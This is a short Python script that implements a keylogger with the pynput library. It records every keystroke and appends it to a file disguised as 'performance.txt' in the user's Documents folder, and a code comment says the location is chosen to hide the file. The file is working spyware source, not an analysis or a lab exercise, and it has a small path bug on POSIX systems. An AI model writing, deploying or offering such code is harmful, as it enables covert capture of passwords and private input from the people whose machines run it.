import os;
from pynput.keyboard import Listener;

FILEPATH = ""

def main():
    with Listener(on_press=keyPress) as listener:
        listener.join()

def keyPress(key):
    print(str(key))
    writeKey(key);

def writeKey(key):
    # We will check what OS we are on to get the path of where to hide the file
    global FILEPATH
    if os.name == 'posix':
        FILEPATH = "~/Documents/performance.txt"
        try:
            with open(FILEPATH, "a") as keyFile:
                keyFile.write(str(key))
        except IOError as e:
            exit(1)
    elif os.name == 'nt':
        print("Running on a Windows System")
        username = os.getlogin()
        FILEPATH = f"C:\\Users\\{username}\\Documents\\performance.txt"
        try:
            with open(FILEPATH, "a") as keyFile:
                keyFile.write(str(key))
        except IOError as e:
            print("Error writing to file:", e)
            exit(1)
    else:
        print("System is unknown");
        exit(1);
        

if __name__ == "__main__":
    main()